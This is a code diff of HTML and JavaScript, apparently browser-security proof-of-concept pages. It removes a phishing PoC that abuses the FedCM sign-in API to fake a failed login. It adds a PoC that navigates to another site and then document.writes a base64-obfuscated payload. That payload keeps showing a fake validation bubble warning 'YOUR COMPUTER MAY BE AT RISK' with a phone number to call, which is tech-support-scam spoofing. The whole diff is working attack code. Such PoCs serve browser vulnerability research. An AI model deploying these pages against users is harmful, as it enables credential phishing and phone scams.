@@ -1,37 +1,28 @@
-<head>PoC of phishing page</head>
+
+
+<body>
+<button onclick=foo()>go</button>
+</body>
+
 <script>
-  async function signIn() {
-    await navigator.login.setStatus("logged-in");
 
-    if (window.location.hash == "#refresh") {
-      navigator.credentials.get({
-        identity: {
-          mediation: "optional",
-          providers: [{
-            configURL: window.location.origin + "/config.json",
-            clientId: "123",
-            nonce: '******',
-          }]
-        }
-      });
-      document.body.innerHTML += "<br><br><p>Oops, failed to sign-in, please make sure you have closed all other sign-in popups</p>"
-    } else {
-      const credential = await navigator.credentials.get({
-        identity: {
-          mediation: "optional",
-          providers: [{
-            configURL: window.location.origin + "/config.json",
-            clientId: "123",
-            nonce: '******',
-          }]
-        }
-      });
-      setTimeout(() => {
-        window.location.href = window.location + "#refresh";
-        window.location.reload();
-      }, 500);
-    }
-  }
+var w;
+var t;
+function foo(){
 
-  window.onload = signIn;
+w = setTimeout('document.location = "http:/www.google.com/csi"',2000)
+t = setInterval('bar()',1);
+}
+
+function bar(){
+try{
+w.location.href;
+}
+catch(e){
+clearInterval(t);
+setTimeout("document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSy5cbkNBTEw6IDgwMC0xMTEtMjIyMiIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));test()",1000);
+}
+
+}
+
 </script>
